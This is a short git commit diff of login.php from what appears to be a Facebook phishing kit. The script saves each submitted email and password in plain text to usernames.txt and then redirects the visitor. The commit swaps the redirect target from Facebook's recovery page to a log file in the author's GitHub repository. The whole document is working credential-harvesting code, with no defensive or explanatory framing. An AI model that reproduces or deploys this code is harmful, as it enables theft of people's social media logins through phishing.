c411ade248fd2363482e3678cd1790f031bf89dd
Gta-fantome-3botg <gtafantome54@gmail.com>
2024-10-05 19:16:19 +0100

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://github.com/Gta-fantome-3botg/Create-bot-free/blob/master/log.txt');
 exit();
 ?>
